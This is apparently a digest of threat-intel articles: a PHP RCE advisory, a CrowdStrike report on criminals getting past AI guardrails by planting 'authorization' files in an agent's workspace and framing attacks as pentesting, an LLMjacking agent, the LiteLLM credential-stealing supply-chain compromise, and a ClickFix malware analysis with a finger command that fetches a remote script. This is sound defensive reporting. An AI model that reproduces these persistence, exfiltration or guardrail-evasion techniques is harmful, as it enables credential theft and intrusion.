Information contained herein is current as of October 21, 2026, and is subject to change as patch releases and threat activity evolve. Recipients should not rely solely on this report for security decisions and should consult with their security teams and SentinelOne account representatives for current guidance.

Attacks, Breaches & Threat Intel.title: Two critical RCEs in PHP core
Attacks, Breaches & Threat Intel.context: Splunk Enterprise Security customers have an Enterprise Security Content Update with detections available
Attacks, Breaches & Threat Intel.full_text:
Update 10/22: Added section detailing observations of in the wild exploitation and associated IOCs.

Cisco Talos is tracking the disclosure of two unauthenticated remote code execution (RCE) flaws in PHP core, dubbed “php2shell”, triggered by a plain HTTP request and exploitable before any application code runs, affecting every PHP build since 5.4. Based on the entities involved in the disclosure, artificial intelligence and associated technologies played a key role in the discovery of these vulnerabilities — yet another example of how these technologies are forcing change across the landscape, most notably on patching processes for organizations because of the wave of vulnerabilities being disclosed.

Cisco customers are covered with the Cisco Talos Network Intrusion Prevention (SNORT®) signatures 67359, 67360, and 67375. These rules are also available in the Community Ruleset for open-source customers. Splunk Enterprise Security customers have an Enterprise Security Content Update with detections available. Please refer to the following recommendations, detection, and coverage guidance for more information.

Details

CVE-2026-109618 and CVE-2026-109619 are both critical vulnerabilities with a CVSS v4.0 score of 9.2.

CVE-2026-109618 occurs when out-of-memory handling interrupts PHP while internal request data is only partially initialized. Request cleanup may then treat invalid data as valid.

CVE-2026-109619 occurs when a stale internal state is reused after its backing memory has already been freed, before normal initialization resets it.

Impact

The potential blast radius is enormous and extends across the PHP ecosystem. The vulnerability sits in PHP core, so applications running affected versions — including WordPress, Drupal, Magento, Shopware, WooCommerce, and Laravel, plus PHP sites hosted through cPanel or Plesk — may be exposed. Note that many older branches will no longer receive fixes, so customers are urged to upgrade to a supported version as soon as possible.

Talos regularly investigates threat actor exploitation of vulnerabilities. State-sponsored and affiliated threat actors, as well as ransomware and other financially motivated groups, all employ tactics to exploit RCE. Talos assesses that all industries running PHP applications are at risk for exploitation if systems remain unpatched.

PHP 8.1 and older are end of life (EOL), and PHP 8.2 security support ends Dec. 31, 2026. Talos’ initial estimates based on open-source intelligence show a significant corpus of PHP systems that will not receive a patch (~50%). If your organization is running PHP 8.1 or older, Talos very strongly advises immediate update to PHP 8.2 or later. There is no patch for PHP 8.1 or older.

Talos is actively monitoring the impact of these CVEs and has not seen them being exploited in the wild yet (as of October 21, 2026 14:00 UTC/10:00 a.m. ET).

Observed Exploitation

Cisco Talos began observing exploitation attempts within hours of the vulnerabilities’ disclosure. So far, most of the activity is scanning, along with some uncoordinated attempts to deliver various payloads. This is expected: scanning or basic exploitation with public proof-of-concept (PoC) code takes far less effort than integrating a vulnerability into an actor’s own tooling. We expect exploitation volume to grow in the coming days, and campaigns to become more sophisticated and coordinated as more capable groups finish updating their tooling and begin deploying it.

Recommendations and detection guidance

Talos strongly recommends all PHP users to upgrade to the available fixed releases. There are no intermediate or temporary controls that provide comprehensive protection; however, PHP advises that the following measure may reduce exposure to specific attack paths:

CVE-2026-109618

Set memory_limit=-1, preferably in a way applications can't override, such as php_admin_value in the FPM pool or Apache configuration, and check that no pool, directory or application setting puts a finite limit back. This removes the controllable PHP memory limit failure, but an underlying allocation failure can still reach the vulnerable path.

Set a low post_max_size. For applications that don't require file uploads, set post_max_size = 8M. If file uploads are necessary, set post_max_size = 32M. Keep upload_max_filesize below post_max_size. Consider enforcing limits at the web server or proxy level for decoded request size, input field count, multipart part count, header count, and nesting depth. These limits must also cover requests without a usable Content-Length.

Use a container or cgroup limit as an availability boundary, preferably with a policy that kills only the affected worker. Do not substitute RLIMIT_AS or RLIMIT_DATA, as these can cause the vulnerable allocation failure.

CVE-2026-109619

Set session.upload_progress.enabled=0 and restart every worker. Use php.ini, an FPM pool, or server configuration that applies before request parsing. Do not rely on ini_set() or FPM .user.ini. This blocks the confirmed session paths but not other variants.

On PHP 8.5, set fatal_error_backtraces=0 and restart every worker. This blocks the confirmed fatal backtrace path only.

Remove invalid or deprecated settings applied per request that emit diagnostics before initialization. Hiding diagnostics with error_reporting, display_errors, or @ does not help.

Fix attacker-reachable fatal errors and execution timeouts, including failures in callbacks, upload or import processing, and cleanup.

This is another vulnerability that owes its discovery to AI and its associated technologies. As we move through 2026, the wave of vulnerabilities and related patches is building. Talos advises organizations to work on a triaged process for prioritizing vulnerabilities with a specific focus on public-facing systems and vulnerabilities that are under active exploitation. The glaring need to prioritize vulnerabilities along with a streamlined process for rolling out patching strongly indicates that the historic trend of “baking in” patches before deployment is not going to survive the AI era.

The true impact of this vulnerability will take time to evaluate. These types of vulnerabilities that impact core technologies tend to cascade into other platforms and applications as they evaluate impact and provide associated patching, harkening back to the waves of exploitation that we saw after Log4J.

Coverage

SNORT® SIDs covering these vulnerabilities for subscribers: 67359, 67360, 67375. Free community rules are live through our Community Ruleset.

Splunk has released an Enterprise Security Content Update (ESCU) related to the ongoing PHP2Shell activity with additional detections. Splunk Enterprise Security customers are urged to download and apply.

Talos would like to highlight the efforts of Ankur Tyagi, Dalton Schaadt, Brandon Stultz, and Matt Killion for providing emergency coverage and mitigations for these threats.

In this video, Talos’ Nick Biasini explains what the vulnerabilities allow adversaries to do, how to assess your exposure, and what defenders should prioritize.

Attacks, Breaches & Threat Intel.title: New PhaaS Platform Uses AI to Craft Phishing Lures and Mask Malicious Activity
Attacks, Breaches & Threat Intel.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Attacks, Breaches & Threat Intel.full_text:
Abnormal AI noted that the AI Studio gives threat actors another way to prepare phishing content without writing every lure from scratch or relying exclusively on ready-made materials. They can instead request content tailored to different pretexts and audiences.

AI Studio is integrated into Athena StealthRoute's broader offering, which also combines domain and link management, a marketplace for campaign materials, visitor monitoring and cloaking controls.

Athena StealthRoute still relies on external infrastructure for credential and token harvesting, but much of the preparation and delivery workflow can be managed through a single console, the researchers noted.

Five of the six offerings in the AI Studio focus on the creation of phishing lures and related materials. However, the sixth option extends to decoy content intended to conceal the phishing attempts. The White Page option produces structured, benign-looking content that could be used as a cover when Athena StealthRoute's cloaking layer directs scanners and other unwanted visitors away from malicious destinations.

How to Detect and Defend Against Athena StealthRoute

Abnormal AI said that for defenders, the platform’s combination of cloaking and customizable content reinforces the limitations of relying on individual messages or link inspections to detect phishing attempts.

“Security scanners may encounter benign content where intended victims would reach malicious destinations, while variations in lure copy can make exact wording less useful for linking-related attacks,” the researchers said in their analysis.

Shared backend infrastructure, matching operator-console code and recognizable link structures offer additional signals for identifying Athena StealthRoute-associated activity even as individual domains and lures change.

Finally, because credential and token harvesting occur through separate downstream services, investigations must also account for the particular theft mechanism involved.

Attacks, Breaches & Threat Intel.title: AI Guardrails Aren’t Stopping Criminal Hackers
Attacks, Breaches & Threat Intel.context: Researchers from the threat intelligence firm CrowdStrike looked at the AI infrastructure powering attacks perpetrated between May and August by four previously unreported...
Attacks, Breaches & Threat Intel.full_text:
As AI adoption spreads among both malicious hackers and defenders, even relatively unsophisticated cybercriminals are incorporating agentic AI into their campaigns and getting around model safeguards, according to new details published on Wednesday about recent successful attacks by four different threat groups.

Researchers from the threat intelligence firm CrowdStrike looked at the AI infrastructure powering attacks perpetrated between May and August by four previously unreported groups—one that operates in Chinese, one in Spanish and English, one in Indonesian, and one in Russian. The former two exhibited sophisticated AI “harnesses,” the software that supports and guides a model to carry out tasks. The latter two showed less technical prowess, researchers found, but were still able to compromise multiple targets. All had left their AI infrastructure openly accessible on web servers, allowing the researchers to analyze their activity and which models they used—largely versions of Anthropic’s Claude as well as versions of the open-weight Deepseek models. All the actors devised ways to allow their campaigns to run autonomously over relatively long periods of time.

“You can leverage different models for different aspects in the operation. Model routing and selection is very important because it’s expensive and a lot of times would be overkill to use newer models,” says Adam Meyers, CrowdStrike's senior vice president of counter adversary work. The researchers observed the attackers using both open- and closed-weight models; in almost all cases, they were using older versions rather than working with frontier models. Meyers notes that doing as much as possible with older models is common in legitimate AI usage, too, as costs mount.

The attackers also used multiple models to take advantage of differences in the guardrails meant to prevent people from using AI to carry out digital attacks.

“The models don't all have equivalent guardrails and protections, even from one company,” Meyers says. He adds about the sophistication of the hacking campaigns overall that “these attacks are not using new exploits or novel vulnerabilities. They’re really just taking advantage of the speed and the volume that you can use AI for in conducting these operations targeting the bulk of security hygiene issues in a lot of these environments—things that were preventable but weren’t prevented.”

The researchers found that all four threat actors circumvented AI safeguards, often by convincing a model that the activity was all legitimate and authorized, often for penetration testing or other security evaluation. One method used by many of the groups involves adding files to an agent’s working directory to try to show that tasks are approved and authorized. The attackers also used traditional jailbreaking methods, crafting prompts and narratives framing their hacking as authorized and benign, and proactively addressing potential questions or concerns the models might raise. The more sophisticated actors were typically more strategic in their world-building, while the less sophisticated actors sometimes resorted to more crude and aggressive prompts that tried to bully the models into accepting that the activity was legitimate.

Attacks, Breaches & Threat Intel.title: Symantec Uncovers AI Agent Hijacking Models for Autonomous Cyber-Attacks
Attacks, Breaches & Threat Intel.context: Researchers from the Symantec Threat Hunter Team found the malicious agent using an AI honeypot – a system that impersonates an unprotected, internet-facing AI service in order...
Attacks, Breaches & Threat Intel.full_text:
A new AI agent developed to run a full cyber-attack without human intervention has been uncovered by security researchers.

The agent was designed to use hijacked AI models to autonomously run up to 100,000 malicious actions without human approval, including scanning for targets, exploiting vulnerabilities, stealing credentials, deploying cryptocurrency miners and reinfecting compromised systems.

Researchers from the Symantec Threat Hunter Team found the malicious agent using an AI honeypot – a system that impersonates an unprotected, internet-facing AI service in order to attract and study attacks against AI infrastructure.

They captured the agent's full instruction set in the summer of 2026, revealing how it was designed to operate autonomously, although the honeypot did not execute the attacker's tools. They described it in more details in a report published on October 21.

AI Honeypot Exposes LLMjacking

The AI honeypot recorded over 127,000 external requests from tens of thousands of unique addresses between its setup and the publication of the report.

Upon analyzing this activity, Symantec researchers discovered that the agent searches for exposed endpoints linked to large language models (LLMs), including self-hosted models, AI gateways and model context protocol (MCP) servers, to use their computing power without paying for it. This technique is sometimes called ‘LLMjacking.’

“Running a model always costs someone money, either in processing time for a self-hosted model or in per-token fees for a commercial one. By routing its work through a stranger's endpoint or a stolen key, the operators shift that cost onto the victim,” Symantec researchers noted.

With this technique, the attackers also gain anonymity and avoid potential account bans the AI model provider would issue for abuse.

The captured instructions included about 74 tools for internet-wide reconnaissance, exploiting common web frameworks, stealing databases, harvesting credentials and managing botnets.

Notably, the attackers used layered instructions designed to override commercial AI models' safety controls, disguising credential theft as legitimate development work.

A separate request also contained an obfuscated script designed to install Monero-mining software, conceal its presence and erase logs.

Self-Directed AI Agent Lowers Barrier to Cybercrime

While Symantec researchers said none of the techniques used by the attackers in this campaign are novel, their combination into a single, self-directed agent lowers the skill required for other attackers to run a broad exploitation campaign.

“An operator can hand the model a goal and let it work,” they added.

They concluded that the activity “marks a shift in how attackers are using AI,” explaining that operators have embedded AI into offensive tools rather than trying to trick public chatbots into misbehaving.

They described the model as “a reasoning engine that plans and drives the attack,” while the tool’s own modules carry out scanning, exploitation and mining against separate victims.

Attacks, Breaches & Threat Intel.title: LiteLLM Compromised, Steals Credentials
Attacks, Breaches & Threat Intel.context: We have not yet confirmed how the attacker gained access to our internal deployment, but currently suspect it was through a recently patched vulnerability
Attacks, Breaches & Threat Intel.full_text:
LiteLLM Compromised

At 11:39 UTC on October 21, a malicious version (1.107.0) of the LiteLLM package was uploaded to PyPI. This version was quarantined on PyPI as of 13:20 UTC. According to ClickPy data, the malicious version received approximately 49,000 downloads.

LiteLLM Docker containers on GHCR and Docker hub also included the trojanized version of LiteLLM. These included the v1.107.0 , latest, main-latest and main-stable tags. These were removed ~13:53 UTC.

The most recent safe version is v1.106.2.

When the malicious package is installed, three files are extracted directly into the site-packages root: cook.pth, cook.py and sitecustomize.py. These packages are designed to be executed whenever a python interpreter is started.

Per LiteLLM developer BerriAI:

malicious actions were taken through three engineers' GitHub accounts, appearing to be by way of stolen GitHub CLI OAuth tokens. The threat actor used one user's account triggered the project-releaser run, and another user's account to approve it. All tokens which were involved in this attack have been revoked.

And in a followup:

GitHub CLI OAuth token exposure After a thorough investigation, we have observed specific situations in which Claude Code will embed a user’s GitHub CLI OAuth token into a response body, and in situations where response bodies are logged, these tokens may appear in LiteLLM logs. Access to our internal LiteLLM deployment We identified an unexpected, innocuously named user account in our internal LiteLLM deployment, which was exposed to the public internet. We believe the attacker gained access to this deployment, obtained the GitHub CLI OAuth tokens from its logs, and subsequently used those credentials to compromise our release workflow. We have not yet confirmed how the attacker gained access to our internal deployment, but currently suspect it was through a recently patched vulnerability.

UPDATES

14:05 UTC - added IOC table

14:15 UTC - added Attack Commits details

14:40 UTC - added Credential Stealer details, noted Docker takedown

15:20 UTC - clarified dual-technique approach novelty and LLM-aided development

16:40 UTC - added diagram of payload flow

16:55 UTC - added LiteLLM statement on root cause

18:35 UTC - LiteLLM has released a blog post

19:05 UTC - added observed post-exploitation activity

21:45 UTC - updated LiteLLM details on root cause

October 22 12:55 UTC - added PyPi download stats

Payload

The payload has strong indications of LLM-aided development, including verbose variable names (encrypted_private_key_output), overly defensive error handling with generic try/except blocks, platform-specific code paths that fail silently on untested platforms (Windows marker path /tmp/ doesn't exist, fcntl/fork calls crash the remote loader), and a dead code module (exec_py) that was defined but never called. The structure suggests iterative prompting: functional on the happy path but brittle at the edges and untested.

Upon startup, the interpreter processes cook.pth, which includes a command to import cook, which loads cook.py. cook.py deobfuscates itself, runs a stealer routine and writes a maker to /tmp/.pc_once_72129118c59f5636c0bb (note this fails on Windows, as the /tmp/ path often does not exist). The stealer routine gathers system, browser, developer, cloud and AI tool secrets, encrypts them and exfiltrates to www.litellm.dev/healthcheck via a post request. This domain is attacker controlled, impersonating LiteLLM infrastructure.

Python interpreters will also attempt to execute sitecustomize.py - however, it will only run on Linux & MacOS machines. This script attempts to fetch domain.txt from a GitHub dead drop (letters9813/pythonclient-test/main/domain.txt). If it receives a response, it will attempt to download a second stage python script from http://<domain>/codepy and run it. As of the time of analysis, the domain.txt file was never populated beyond initial test values. The repo has been taken down by GitHub as of 1:30 PM UTC.

The dual-technique approach, using both .pth files and sitecustomize.py simultaneously, appears to be the first documented case in the wild.

Credential Stealer

The embedded credential stealer, internally named privcollect, harvests sensitive data across 16 modules targeting browsers, cloud providers, and AI services. It extracts:

browser credentials and cookies from Chrome, Firefox, Edge, and Safari

AWS credentials from ~/.aws/, environment variables, and EC2/ECS instance metadata (IMDS)

GCP service account keys and application default credentials

Azure tokens from the CLI cache

In terms of AI-specific theft, it targets API keys for OpenAI, Anthropic, Cohere, and other LLM providers stored in environment variables or config files. It also collects SSH private keys, GPG keys, and shell history files.

LiteLLM Proxy stores upstream API keys in a PostgreSQL database. The stealer queries this database directly (SELECT * FROM "LiteLLM_CredentialsTable" LIMIT 500) to extract all configured provider credentials.

Harvested data is encrypted with AES-256-CBC (key wrapped with RSA-4096) and exfiltrated over HTTP to www.litellm[.]dev/healthcheck using the hardcoded X-Token header and an Internet Explorer 7 user-agent string.

Attacker Commits

The payload originates with malicious commits made on github.com/Berri-AI/litellm. Note, this is a hyphenated variant of the legitimate BerriAI organization. This repository, not visible on GitHub, was used to inject the payload into the release pipeline.

Between 08:56 and 10:46 UTC on October 21, the attacker pushed 10 commits using the author email ckdi82fkoos@proton.me. The first nine commits were created on GitHub.com and therefore signed with GitHub's verified signature.

The first three (within 2 minutes) added the persistence files: cook.pth, cook.py, and sitecustomize.py. Four more commits bumped version numbers to 1.107.0.

After a 39-minute gap, two commits refined the payload and added the critical data = "cook" directive to pyproject.toml, which instructed the build tool to bundle the malware into the wheel.

A final commit, made 58 minutes later with a different email (Berri-AI@users.noreply.github.com) and unsigned (suggesting a different environment), added COPY cook ./cook to the Dockerfiles.

Although the Berri-AI repository is unavailable, all commits remain accessible through the parent repository due to Git's fork object sharing. The full diff is available at: github.com/BerriAI/litellm/compare/a8113b0d...20535d8f

Post-Exploitation Activity

Wiz Research has observed abuse of stolen credentials, starting approximately 4.5 hours post-exfiltration. Between 16:20 and 17:01 UTC, the attacker validated AWS instance role credentials harvested from compromised CI runners and Kubernetes nodes across multiple environments, from the following IP addresses:

168.100.8[.]57

165.227.201[.]8

Each credential was checked with sts:GetCallerIdentity, followed by bedrock:ListFoundationModels and a ListModels call, consistent with LLMjacking.

In a small number of environments, the attacker also enumerated IAM (ListRoles, ListUsers, ListAccessKeys) and performed general discovery (ListAccounts, DescribeTrails, etc.).

Recommendations

Wiz customers should review our Threat Intel Center advisory: Supply Chain Attack Targeting LiteLLM .

Attacks, Breaches & Threat Intel.title: Amazon-Themed ClickFix Campaign Serves Up Finger-Licking Malware
Attacks, Breaches & Threat Intel.context: Introduction Attackers often exploit trusted brands in their initial access lures, either by spoofing their logos or by abusing legitimate features
Attacks, Breaches & Threat Intel.full_text:
Introduction

Attackers often exploit trusted brands in their initial access lures, either by spoofing their logos or by abusing legitimate features. In the past few months, Huntress investigated incidents that began with ClickFix lures using ChatGPT, Google Docs, and many more trusted tools. In an attack method that has already struck at least three Huntress customers, a threat actor using paid search results led victims into ClickFix-style social engineering that, as is usually the case, prompts the victims to run a command in their terminal.

But the command used in this lure unusually leverages a decades-old (and infrequently used) network utility, finger, to initiate a convoluted and elaborately obfuscated sequence of attack scripts that, eventually, led to the victim's computer being infected with at least three completely different forms of infostealer and remote access malware. Threat actors have been abusing the finger utility, which (although present on most modern computers) is not well understood by most computer users, in ClickFix attacks for at least a year.

In the course of the investigation, Huntress Labs' Adversary Tactics observed a full infection chain, captured and reverse-engineered the components, and analyzed network traffic sent and received by the various payloads, in order to build a complete picture of the attack method.

A Google search, a spoofed Amazon login, and a fake CAPTCHA

Figure 1: The sponsored Google search result that led to a fake Amazon login page

The attack started with a simple search. The top sponsored result at the time of the attacks for the keyword "amazon business" (shown above) was hosted on a deceptive-looking subdomain of an attacker-controlled domain: orders-amazon[.]com[.]advancedfences[.]com.

The malicious link redirected to a fake Amazon login page, hosted in a private Google Sites cloud storage location, sites.google[.]com/view/ch-pc/sign-in. The page prompted the user to enter their email or phone number.

Figure 2: Spoofed Amazon login page

After the user hits "submit," the page pops up a fake CAPTCHA dialog. Clicking a button labeled "I'm not a robot" saves a pastejacked command to the user's clipboard, and a pop-up window instructs the user to run the command in the Windows Run box.

Figure 3: The ClickFix attack prompts the user to paste a command into their Run dialog on Windows computers

Although the following analysis covers Windows-specific payloads, the attack was cross-platform: Users who visited the page with a browser User-Agent that references macOS received alternate instructions to run a script in the Mac Terminal application, but the destination URL in that instance—hxxp[://]ashevilleroofingcontractor[.]com/curl/bc9e2dac08fb4f83dddb44f89bf7082bb4134697fbf6a99ad8ce30c634e9fe8a—was offline at the time Huntress conducted this research.

Stage 1: Literally giving users the finger

The entered commands launch the built-in utility finger.exe to communicate with a specific user account on the attacker-controlled domain grillrecipespro[.]com.

The finger command is ancient, by internet standards, predating the existence of the web itself by nearly two decades. In its halcyon heyday, people who used the internet would interact directly with Unix shell accounts on remote servers; finger offered a way for someone who owned an account to publish their contact information, a clever quotation or two, even ASCII art to what was essentially a personal bulletin board posted to their virtual office door, inside a file named .plan, stored in the root of the user's shell account directory. But for most of the past year, finger has developed a new life as a LOLbin abused in ClickFix attacks.

In this attack, the threat actor has placed a Windows script in a .plan file tied to a user account. The ClickFix command that invokes finger is, itself, obfuscated (in a rudimentary way) by breaking up the characters that make up the command with a comma, caret (^), hyphen, and underscore characters, which the Windows command interface helpfully ignores. The command, pasted into a text editor, looks like this:

Figure 4: The ClickFix command text

The command itself is not readily visible in the Run dialog because the threat actors have crafted the command line with a suffix that uses extra spaces and hyphen characters to trail the actual command. To an end user, the effect is that the content of the Run dialog seems to say, simply, "Push the Enter key."

Figure 5: The Run dialog conceals the command

The effect of the command line, however, is far from benign. It instructs the Windows command interface to execute the content contained within the .plan file at the other end of the command finger DLVBUCeFfF@grillrecipespro[.]com.

Figure 6: The top of the adversary-controlled user account's .plan file

The script content inside the remote .plan file is "hidden" with the use of 68 extra carriage-returns that put the weaponized content beyond the screen height of a typical terminal console. (Finger commands transmit plaintext over port 79/tcp by default, which should make them easy to detect or block, but since nobody uses finger anymore, most networks don't block this content.)

Well below the top of the screen, the .plan file contains a script with instructions to trigger the first stage of the attack, which requires an executable Python interpreter named ipyw32.exe that is included in a Python distribution called IronPython. So the script spawns curl to download and unpack IronPython.3.4.2.zip from its repository location, github[.]com/IronLanguages/ironpython3/releases/download/v3.4.2/IronPython.3.4.2.zip.

Figure 7: Don't you love it when a .plan comes together?

"The script places the IronPython ZIP file in the user's Temp directory, as a file with a .pdf extension." It then uses the tar command (which is now a part of modern Windows installations) to unpack the .zip; The script then navigates to the \net462 folder inside the nested structure of the unzipped archive, and passes a Base64-encoded, zlib-compressed Python script data blob directly to the ipyw32.exe program as a command flag.

The end result of this process retrieves and executes the content from hxxp://grillmasterchef[.]com/90e4a147-1234-505c-a024-062e543b5df8/timer6, and this is where it gets interesting.

Stage 2: Begin the barbeque

The timer6 file is a Python script that has been encoded in Base64, which has then had some of the latin alphabet characters substituted with cyrillic letters. Since the Base64 encoding scheme doesn't interpret cyrillic characters, a straight decode won't work. The script reverses the substitution of these alternate letters back to ASCII characters, then decodes the Base64 blob.

Figure 8: The top of the still-encoded timer6 Base64 (cyrillic lowercase letter "Yo" highlighted), with the script's cyrillic character/latin character substitution rules (inset)

Several cybersecurity vendors appear to believe that timer6 leverages a now-deprecated adversary simulation framework called Veil, which was designed to obfuscate Metasploit Meterpreter Python scripts to make them less easily detectable during penetration testing. That's arguably accurate, but not entirely correct: In reviewing the timer6 script, it appears to leverage some aspects of Veil's Python shellcode_inject/flat.py—in particular, it contains the same HeapCreate flag, HeapAlloc flag, buffer-copy pattern, and native API sequence. Veil explicitly describes this module as designed for inline shellcode injection, which is one thing that timer6 does. But there are other aspects of timer6's behavior that stray from what the full Veil package does by default.

The content of timer6, after decoding, is another Python script.

Figure 9: The second layer of timer6, a Python script decoded from Base64, which contains another decoding layer for XORed data that has been Base64 encoded

This shellcode layer is protected with a 19-byte XOR key (Hex: 84 0d ff da 80 29 b6 1b 52 9b 42 40 5d 55 aa 80 a5 7e 7c) that is embedded within the script as a separate Base64 blob.

Figure 10: The XOR key is in the house with you right now

When unpacked and decoded, the output of this script is a Windows PE malware loader, which executes as soon as the script decodes it. This malware loader searches the disk for a specific .ini file that contains a URL. If it finds the URL in the .ini file, it downloads whatever is at the other end (using the User-Agent string Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36), then performs RC4 decryption of the downloaded file.

In this instance, the loader connected to another barbeque-themed URL, hxxps://grillmasterchef[.]com/90e4a147-1234-505c-a024-062e543b5df8/v6, and decrypted the contents, which was another malware executable. The RC4 decryption key is prepended as the first 64 bytes of this v6 file.

The v6 malware, once decrypted, is automatically injected into memory by the script. The security vendor consensus is that this is a malware called Doina, which can serve as a delivery mechanism for other malware. In 2024, security vendor Halcyon reported that Doina was implicated as a precursor step to ransomware attacks, but Doina has multiple features and a modular architecture that make it useful as a general-purpose RAT, infostealer, and profiler tool.

Immediately after Doina began running, it began to communicate with the same grillmasterchef server from which it originated, sending a series of HTTPS POST communications, then retrieving a ZIP file from the URL hxxps://kiriosyka[.]com/KsxmmKiN5N0j/sqr-viewertr6: a 52MB compressed file that contains a full, portable instance of the Node.js code interpreter, and a malicious, heavily obfuscated index.js script. The malware unpacks this to the location C:\ProgramData\NodeView, then runs the (non-malicious) node.exe interpreter, passing it the index.js file as an argument.

Figure 11: Unzipped contents of the sqr-viewertr6 file

It's also notable that other elements of this attack deploy their various payloads, logs, and related files to both the root of the C:\ProgramData\ path, and to folders beneath that directory.

Stage 3: Cranking up the heat with more malware

While the index.js is a form of malware in its own right, it is also designed with a modular architecture that can download, decrypt, and inject various kinds of encrypted malicious payloads into memory as fileless malware.

In this investigation, the Node component pulled down two additional files, which then began beaconing and performing malware-esque activities. The two files were given randomized names that resemble GUIDs; One is only about 17KB in size, the other greater than 19MB in size. Neither has a discernible PE header, and both have high entropy. So what's going on here?

All three files are part of a package. The index.js component decrypts both files using AES-256-GCM, in which the first 12 bytes of each file is the nonce value, and the next 16 bytes are the key. It then executes the smaller file.

It turns out that the smaller of the two files is a shellcode reflective DLL injector (or sRDI), essentially a loader for the larger file. The larger file is an infostealer malware, allegedly Lumma Stealer. The sRDI component injects the stealer into memory through process hollowing, and the malware immediately begins beaconing.

As part of its initial check-in with its C2, the stealer malware transmits the hostname, username, and other profiling information as part of an initial HTTPS POST connection. It then switches gears and communicates over the websocket protocol for continuous monitoring.

Figure 12: Packet capture of websocket session traffic generated by the malware, receiving file name conventions to search for from the C2 server (red), and sending a unique identifier and "heartbeat" during idle time (blue).

The websocket connection included the URL pointing to the suspected Lumma Stealer download package, as well as filenames and other strings indicating software targets of interest to the stealer:

Browsers (Chrome, Edge, Firefox, Opera)

Cryptocurrency wallet apps (Ledger, Electrum, Atomic Wallet)

Password managers (LastPass, Dashlane, 1Password, NordPass, RoboForm)

Email clients

Command processors like PowerShell

As with many of the other elements of this attacker infrastructure, the C2 addresses the malware communicates with are all themed around barbeque: thegrilljournal[.]com and homelygrill[.]com are used for exfil after an initial check-in to perfectgrillrecipes[.]com. The malware originates from the domain liokida[.]com (which, as far as we can tell, is not a barbeque term), and the stealer contains this domain embedded inside itself as a string. An earlier version of the attack also linked to the stealer payload from kiriosyka[.]com.

Interestingly, there are two forms of periodic updates that the Node malware, index.js performs: It can call for an update file that contains both the stealer and the reflective loader executable payloads and the Node.js interpreter files (which total at roughly 58MB in size), or it can retrieve just the payload files (index.js and the two .tmp files, at just under 20MB). To get the smaller-sized update, the malware calls the same URL with the query string ?exclude_bins=true at the end.

Every file retrieval request returns an archive with a unique hash, because the server hosting these payloads appends a random amount of null bytes to the archive at the time of the request. The payload inside the archive files changed once or twice per day.

Figure 13: Unzipped contents of the sqr-viewertr6 file downloaded with the exclude_bins=true query string, which does not include the Node executable

Finally, we observed yet another malicious component installed as part of the delivery of this malware package: A pirated copy of an RMM called NetSupport was also deployed inside the C:\ProgramData directory under the nonstandard folder Prodclear. The license key and copyright information for this RMM indicate the RMM is at least eight years old. The RMM maintains extensive log files of its activity within a subdirectory.

NetSupport's communication happens over an HTTPS connection that uses the nonstandard port 725/tcp, and this particular installation communicates with the IP address 167.148.201[.]106. The C2 traffic generated by the NetSupport Client software connects to the HTML file fakeurl.htm at the same IP address.

Figure 14: The NetSupport Client software executable was cryptographically signed eight years ago.

Stage 4: Chef Boyardon't and the Gastro Infra

As previously mentioned, the c2 and payload delivery .com domains used by the malware mostly sound like titles of a high-end magazine about cooking with charcoal: GrillRecipesPro, TheGrillJournal, EmbersAndBites, GrillMasterChef, and HomelyGrill all serve as both C2 and payload delivery domains. We found several relations between the domains, from common hosting and DNS servers to multiple payloads communicating with or being delivered from the domains.

Figure 15: Relationship map tying together C2 domains and payload delivery domain Liokida to multiple Lumma Stealer executables

Figure 16: URL, domain, and file relationships between Doina C2 domains and payload delivery domain Kiriosyka

The decidedly non-foody domains Liokida and Kiriosyka host the Lumma Stealer/Node.js payload packages, as well as several other malicious payloads that were not called during this attack.

Figure 17: Common URL patterns used to deliver payloads from Kiriosyka and Liokida domains

We also observed an IP address (167.148.201.106) used as a C2 for the NetConnect Client RMM payload. The IP address is used solely for hosting the legitimate website for a restaurant based in Detroit, but that domain has not been observed being abused. The C2 traffic connected directly to the IP address.

Figure 18: IP address linked to a restaurant domain being used for C2 communications

Figure 19: The deobfuscated Doina code calls the Lumma Stealer download and executes it

Mitigation

The best defense against ClickFix is user awareness of what it is and how it works. The attacks succeed because a large proportion of users simply don't recognize the risk of following an on-screen prompt. If you've made it this far, please tell your colleagues, family, and friends what to watch for. No legitimate CAPTCHA should ever ask anyone to paste an arbitrary line of text into an operating system command prompt. It just isn't how CAPTCHAs work.

Google's paid ad function can unwittingly host malicious links, in a technique commonly known as malvertising. Back in August, Huntress analysts reverse-engineered a MacSync Stealer sample collected from an incident that began with the user clicking on a sponsored Google result after searching for how to install Claude on a Mac.

Luckily for defenders, the way Google ad-clicks are redirected for billing the advertiser leaves some key signifiers for detection: aclk in the URL path and gclid in the resulting query strings.

Figure 20: The identifiers that Google uses to bill advertisers when users click on a sponsored result

These parameters indicate that a user reached a site through a Google-sponsored ad, even if later redirects obscure the original source. Investigators can use these markers in browser history, proxy logs, or URL telemetry to reconstruct the ad-to-malicious-site chain and connect related campaigns or domains. Reporting these identifiers to Google can kneecap attackers by cutting off their access to the ad ecosystem (at least, until they create a new account and start again).

Huntress customers and partners have an additional tool in their arsenal: A new feature called Attack Reduction is available now as part of Huntress Managed ESPM Early Access. ClickFix attacks typically prompt Windows users to open the Windows Run dialog box in order to enter a command; This feature enables admins to toggle access to the Run dialog for the majority of users who never need it. (See how it works and what it blocks.)

Figure 21: Closeup of the Attack Reduction feature that prevents users from opening the Run dialog in ESPM Early Access

It doesn't stop every form of ClickFix—notably, attackers sometimes ask users to open PowerShell, the command prompt, or even to enter commands into the address bar in Windows Explorer—but it's a very commonly abused method that most people on managed endpoints won't miss.

As reported in our newly released Tragic Quadrant, ClickFix accounted for about 2.2% of the Managed Endpoint Detection and Response (EDR) detection signals Huntress has seen this year so far, but nearly 99% of those detections were high severity. Posts on social media sites still show that lots of users are getting tricked into falling for a ClickFix scam on a daily basis.

Just one malicious command pasted into a Run box can open the door to infostealers, remote access tools, ransomware, or other malicious software. The results can be devastating, leading to financial loss and, potentially, compromise of an entire enterprise. But just like we learned to look both ways before crossing the street, we'll learn not to do anything a dialog box on a web page tells us to do, just because it asks. An ounce of skepticism is worth hours of remediation.
